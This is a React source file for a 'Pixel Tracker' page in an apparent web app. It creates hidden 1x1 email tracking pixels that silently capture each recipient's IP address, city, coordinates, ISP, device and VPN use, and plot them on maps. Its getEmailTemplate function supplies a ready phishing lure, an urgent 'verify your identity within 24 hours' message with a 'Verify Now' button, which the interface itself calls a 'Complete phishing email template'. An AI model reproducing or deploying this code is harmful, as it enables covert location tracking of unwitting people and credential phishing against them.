import React, { useState, useEffect } from "react";
import { useAuth } from "../contexts/AuthContext";
import { db } from "../firebase/config";
import { collection, query, where, onSnapshot } from "firebase/firestore";
import { Copy, CheckCircle, Eye, Globe, Mail, Plus, ChevronDown, ChevronUp, AlertCircle, MapPin } from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

export default function PixelTracker() {
  const { currentUser } = useAuth();
  const [pixels, setPixels] = useState([]);
  const [label, setLabel] = useState("");
  const [generating, setGenerating] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [copiedId, setCopiedId] = useState(null);
  const [openPixel, setOpenPixel] = useState(null);
  const [activeTab, setActiveTab] = useState({});

  useEffect(() => {
    if (!currentUser) return;
    const q = query(collection(db, "pixelLinks"), where("uid", "==", currentUser.uid));
    const unsub = onSnapshot(q, (snap) => {
      const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      data.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
      setPixels(data);
    });
    return unsub;
  }, [currentUser]);

  async function handleCreate(e) {
    e.preventDefault();
    if (!label.trim()) { setError("Please enter a label"); return; }
    setGenerating(true); setError(""); setSuccess("");
    try {
      const res = await fetch(BACKEND_URL + "/api/links/pixel/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid: currentUser.uid, label: label.trim() }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      setSuccess("Pixel created successfully!");
      setLabel("");
    } catch (err) {
      setError(err.message || "Failed to create pixel");
    }
    setGenerating(false);
  }

  function copy(text, id) {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  // Tab 1: HTML embed code
  function getHtmlEmbed(pixelUrl) {
    return `<img src="${pixelUrl}" width="1" height="1" style="display:none" alt="" />`;
  }

  // Tab 2: Plain URL (for Gmail insert image etc.)
  function getPlainUrl(pixelUrl) {
    return pixelUrl;
  }

  // Tab 3: Full email HTML template with pixel + tracking link
  function getEmailTemplate(pixelUrl) {
    return `<!DOCTYPE html>
<html>
<body style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto">
  <h2 style="color:#1a73e8">Important: Your account requires action</h2>
  <p>Dear User,</p>
  <p>We noticed unusual activity. Please verify your identity within 24 hours.</p>
  <a href="https://traxalon-main-01.vercel.app" 
     style="background:#1a73e8;color:white;padding:12px 24px;
     text-decoration:none;border-radius:4px;display:inline-block;margin:16px 0">
    Verify Now
  </a>
  <p style="color:#999;font-size:11px">If you did not request this, ignore this email.</p>
  <!-- Tracking Pixel -->
  <img src="${pixelUrl}" width="1" height="1" border="0" alt=""
       style="display:none!important;visibility:hidden;width:1px;height:1px;" />
</body>
</html>`;
  }

  return (
    <div className="min-h-screen bg-surface pt-16 text-text-primary">
      <div className="max-w-5xl mx-auto px-4 py-8">

        <div className="mb-8">
          <h1 className="font-display text-4xl tracking-wider">PIXEL <span className="text-primary">TRACKER</span></h1>
          <p className="font-body text-sm text-text-secondary mt-1">
            Invisible 1×1 tracking pixels — embed in emails to silently capture IP, location, email client and device on open.
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-3 gap-4 mb-8">
          {[
            { label: "Total Pixels", value: pixels.length, icon: <Eye className="w-4 h-4" /> },
            { label: "Total Opens", value: pixels.reduce((a, p) => a + (p.totalOpens || 0), 0), icon: <Mail className="w-4 h-4" /> },
            { label: "Unique IPs", value: pixels.reduce((a, p) => a + (p.uniqueIPs?.length || 0), 0), icon: <Globe className="w-4 h-4" /> },
          ].map(stat => (
            <div key={stat.label} className="bg-surface-card border border-surface-border rounded-xl p-4">
              <div className="flex items-center gap-2 text-text-muted mb-2">{stat.icon}<span className="font-body text-xs uppercase tracking-wider">{stat.label}</span></div>
              <div className="font-display text-3xl text-text-primary">{stat.value}</div>
            </div>
          ))}
        </div>

        {/* Create Pixel */}
        <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6 mb-6">
          <h2 className="font-display text-xl tracking-wider mb-1">CREATE <span className="text-primary">PIXEL</span></h2>
          <p className="font-body text-xs text-text-muted mb-5">
            Free — no credits needed. Fires silently on email open, no click required.
          </p>

          {error && (
            <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
              <AlertCircle className="w-4 h-4 flex-shrink-0" />{error}
            </div>
          )}
          {success && (
            <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/30 text-green-400 rounded-lg px-3 py-2.5 font-body text-sm mb-4">
              <CheckCircle className="w-4 h-4 flex-shrink-0" />{success}
            </div>
          )}

          <form onSubmit={handleCreate} className="flex flex-col md:flex-row gap-3">
            <input
              type="text"
              value={label}
              onChange={e => setLabel(e.target.value)}
              placeholder="Label — e.g. Invoice Email, Gmail Campaign, Test"
              className="flex-1 bg-surface border border-surface-border rounded-xl px-4 py-3.5 font-body text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:border-primary transition-colors"
            />
            <button
              type="submit"
              disabled={generating}
              className="px-6 py-3.5 bg-primary text-surface font-body font-bold rounded-xl hover:bg-primary-dark transition-all shadow-glow disabled:opacity-50 flex items-center gap-2 whitespace-nowrap"
            >
              <Plus className="w-4 h-4" />
              {generating ? "Creating..." : "Create Pixel"}
            </button>
          </form>

          {/* How it works */}
          <div className="mt-5 bg-surface border border-surface-border rounded-xl p-4">
            <p className="font-body text-xs text-primary uppercase tracking-wider mb-3">💡 How it works</p>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              {[
                { step: "1", title: "Create pixel", desc: "Enter a label and click Create — free, instant" },
                { step: "2", title: "Embed in email", desc: "Copy the URL or HTML code and paste into your email" },
                { step: "3", title: "Track opens", desc: "When recipient opens email, their IP, location and device are captured instantly" },
              ].map(s => (
                <div key={s.step} className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-primary/20 text-primary font-mono text-xs flex items-center justify-center flex-shrink-0 mt-0.5">{s.step}</div>
                  <div>
                    <div className="font-body text-xs font-semibold text-text-primary">{s.title}</div>
                    <div className="font-body text-xs text-text-muted">{s.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Pixel List */}
        <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
          <h2 className="font-display text-xl tracking-wider mb-6">YOUR <span className="text-primary">PIXELS</span></h2>

          {pixels.length === 0 ? (
            <div className="text-center py-16">
              <div className="text-5xl mb-4">👁️</div>
              <p className="font-body text-text-muted">No pixels yet — create one above</p>
              <p className="font-body text-xs text-text-muted mt-1">It's free, no credits needed</p>
            </div>
          ) : (
            <div className="space-y-4">
              {pixels.map(pixel => (
                <div key={pixel.id} className="bg-surface border border-surface-border rounded-2xl overflow-hidden">

                  {/* Pixel header */}
                  <div
                    className="p-5 flex items-center justify-between gap-3 cursor-pointer hover:bg-primary/5 transition-all"
                    onClick={() => setOpenPixel(openPixel === pixel.id ? null : pixel.id)}
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-body text-base font-semibold text-text-primary">{pixel.label}</span>
                        {(pixel.totalOpens || 0) > 0 && (
                          <span className="text-xs px-2 py-0.5 rounded-full bg-green-500/10 text-green-400 border border-green-500/20 font-mono animate-pulse">● LIVE</span>
                        )}
                      </div>
                      <div className="font-mono text-xs text-text-muted truncate">{pixel.pixelUrl}</div>
                    </div>
                    <div className="flex items-center gap-4 flex-shrink-0">
                      <div className="text-center">
                        <div className="font-display text-2xl text-primary">{pixel.totalOpens || 0}</div>
                        <div className="font-body text-xs text-text-muted">opens</div>
                      </div>
                      <div className="text-center">
                        <div className="font-display text-2xl text-primary">{pixel.uniqueIPs?.length || 0}</div>
                        <div className="font-body text-xs text-text-muted">unique IPs</div>
                      </div>
                      {openPixel === pixel.id
                        ? <ChevronUp className="w-5 h-5 text-text-muted" />
                        : <ChevronDown className="w-5 h-5 text-text-muted" />
                      }
                    </div>
                  </div>

                  {openPixel === pixel.id && (
                    <div className="border-t border-surface-border p-5 space-y-5">

                      {/* Embed code tabs */}
                      <div>
                        <p className="font-body text-xs text-primary uppercase tracking-wider mb-3">📋 Embed Code</p>
                        <div className="flex gap-2 mb-3 flex-wrap">
                          {["url", "html", "template"].map(tab => (
                            <button
                              key={tab}
                              onClick={() => setActiveTab(t => ({ ...t, [pixel.id]: tab }))}
                              className={`px-3 py-1.5 rounded-lg font-body text-xs transition-colors ${(activeTab[pixel.id] || "url") === tab
                                ? "bg-primary text-surface font-bold"
                                : "bg-surface border border-surface-border text-text-muted hover:border-primary/40"}`}
                            >
                              {tab === "url" ? "🔗 Plain URL" : tab === "html" ? "📄 HTML Code" : "📧 Email Template"}
                            </button>
                          ))}
                        </div>

                        <div className="relative">
                          <pre className="bg-surface border border-surface-border rounded-xl p-4 font-mono text-xs text-green-400 overflow-x-auto whitespace-pre-wrap break-all">
                            {(activeTab[pixel.id] || "url") === "url"
                              ? getPlainUrl(pixel.pixelUrl)
                              : (activeTab[pixel.id] || "url") === "html"
                                ? getHtmlEmbed(pixel.pixelUrl)
                                : getEmailTemplate(pixel.pixelUrl)
                            }
                          </pre>
                          <button
                            onClick={() => copy(
                              (activeTab[pixel.id] || "url") === "url"
                                ? getPlainUrl(pixel.pixelUrl)
                                : (activeTab[pixel.id] || "url") === "html"
                                  ? getHtmlEmbed(pixel.pixelUrl)
                                  : getEmailTemplate(pixel.pixelUrl),
                              pixel.id + "-code"
                            )}
                            className="absolute top-3 right-3 flex items-center gap-1.5 px-3 py-1.5 bg-surface-border text-text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors"
                          >
                            {copiedId === pixel.id + "-code"
                              ? <><CheckCircle className="w-3 h-3 text-green-400" /> Copied!</>
                              : <><Copy className="w-3 h-3" /> Copy</>
                            }
                          </button>
                        </div>

                        <p className="font-body text-xs text-text-muted mt-2">
                          {(activeTab[pixel.id] || "url") === "url"
                            ? "↑ Use this URL in Gmail: Compose → Insert Photo → Web Address → paste URL"
                            : (activeTab[pixel.id] || "url") === "html"
                              ? "↑ Paste inside your email HTML body — invisible, fires on open"
                              : "↑ Complete phishing email template — replace the link and send"
                          }
                        </p>
                      </div>

                      {/* Hit log */}
                      {pixel.hits?.length > 0 ? (
                        <div>
                          <p className="font-body text-xs text-primary uppercase tracking-wider mb-3 pb-1.5 border-b border-surface-border">
                            📬 {pixel.hits.length} Open{pixel.hits.length > 1 ? "s" : ""} — latest first
                          </p>
                          <div className="space-y-3 max-h-[800px] overflow-y-auto">
                            {[...pixel.hits].reverse().map((hit, i) => (
                              <div key={i} className="bg-surface-card border border-surface-border rounded-2xl p-4">

                                {/* Hit header */}
                                <div className="flex items-start justify-between gap-3 mb-3 flex-wrap">
                                  <div className="flex items-center gap-2 flex-wrap">
                                    <span className="font-body text-sm font-semibold text-text-primary">
                                      Open #{pixel.hits.length - i} &nbsp;·&nbsp; {hit.emailClient || "Unknown Client"}
                                    </span>
                                    {hit.isRepeatOpen && (
                                      <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 font-mono">🔁 Repeat</span>
                                    )}
                                    {hit.isForwarded && (
                                      <span className="text-xs px-2 py-0.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/20 font-mono">↗ Forwarded</span>
                                    )}
                                    {hit.isProxy && (
                                      <span className="text-xs px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 font-mono">🛡 VPN/Proxy</span>
                                    )}
                                    {hit.isMobileNetwork && (
                                      <span className="text-xs px-2 py-0.5 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20 font-mono">📱 Mobile</span>
                                    )}
                                  </div>
                                  <div className="text-right flex-shrink-0">
                                    <div className="font-mono text-xs text-text-muted">
                                      {hit.openedAt ? new Date(hit.openedAt).toLocaleString("en-IN") : ""}
                                    </div>
                                    {hit.timezone && <div className="font-mono text-xs text-text-muted">{hit.timezone}</div>}
                                  </div>
                                </div>

                                {/* IP Location map if coordinates available */}
                                {hit.lat && hit.lon && (
                                  <div className="mb-3 rounded-xl overflow-hidden border border-surface-border" style={{ height: 180 }}>
                                    <iframe
                                      title={`pixel-map-${i}`}
                                      src={`https://maps.google.com/maps?q=${hit.lat},${hit.lon}&z=13&output=embed`}
                                      width="100%"
                                      height="100%"
                                      style={{ border: 0, display: "block" }}
                                      allowFullScreen
                                      loading="lazy"
                                    />
                                  </div>
                                )}

                                {/* All details grid */}
                                <div className="grid grid-cols-2 gap-x-6 gap-y-3">
                                  <HitRow label="IP Address" value={hit.ip} />
                                  <HitRow label="Email Client" value={hit.emailClient} />
                                  <HitRow label="Country" value={hit.country ? `${hit.country} ${hit.countryCode ? `(${hit.countryCode})` : ""}` : null} />
                                  <HitRow label="Region" value={hit.region} />
                                  <HitRow label="City" value={hit.city} />
                                  <HitRow label="ZIP / Pincode" value={hit.zip} />
                                  <HitRow label="Latitude" value={hit.lat} />
                                  <HitRow label="Longitude" value={hit.lon} />
                                  <HitRow label="Timezone" value={hit.timezone} />
                                  <HitRow label="ISP" value={hit.isp} />
                                  <HitRow label="Organisation" value={hit.org} />
                                  <HitRow label="ASN" value={hit.asn} />
                                  <HitRow label="Proxy / VPN" value={hit.isProxy != null ? String(hit.isProxy) : null} />
                                  <HitRow label="Hosting / VPS" value={hit.isHosting != null ? String(hit.isHosting) : null} />
                                  <HitRow label="Mobile Network" value={hit.isMobileNetwork != null ? String(hit.isMobileNetwork) : null} />
                                  <HitRow label="OS" value={hit.os} />
                                  <HitRow label="Device" value={hit.device} />
                                  <HitRow label="Browser" value={hit.browser} />
                                  <HitRow label="Accept Language" value={hit.acceptLanguage} />
                                  <HitRow label="Referrer" value={hit.referer} />
                                  <div className="col-span-2">
                                    <HitRow label="User Agent" value={hit.userAgent} />
                                  </div>
                                </div>

                                {/* Google Maps link */}
                                {hit.lat && hit.lon && (
                                  <div className="flex gap-2 mt-3">
                                    <a
                                      href={`https://www.google.com/maps?q=${hit.lat},${hit.lon}`}
                                      target="_blank"
                                      rel="noreferrer"
                                      className="flex items-center gap-1.5 px-3 py-2 bg-surface border border-surface-border rounded-lg font-body text-xs text-primary hover:bg-primary/10 transition-colors"
                                    >
                                      <Globe className="w-3.5 h-3.5" /> Google Maps
                                    </a>
                                    <a
                                      href={`https://maps.apple.com/?q=${hit.lat},${hit.lon}`}
                                      target="_blank"
                                      rel="noreferrer"
                                      className="flex items-center gap-1.5 px-3 py-2 bg-surface border border-surface-border rounded-lg font-body text-xs text-text-primary hover:bg-primary/10 transition-colors"
                                    >
                                      🗺️ Apple Maps
                                    </a>
                                  </div>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      ) : (
                        <div className="text-center py-10 border border-dashed border-surface-border rounded-xl">
                          <div className="text-4xl mb-3">📭</div>
                          <p className="font-body text-sm text-text-muted">No opens yet</p>
                          <p className="font-body text-xs text-text-muted mt-1">
                            Embed the pixel in an email and send it — opens appear here in real time
                          </p>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function HitRow({ label, value }) {
  if (value == null || value === "" || value === "null" || value === "undefined") return null;
  return (
    <div>
      <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-0.5">{label}</div>
      <div className="font-mono text-xs text-text-primary break-all">{String(value)}</div>
    </div>
  );
}
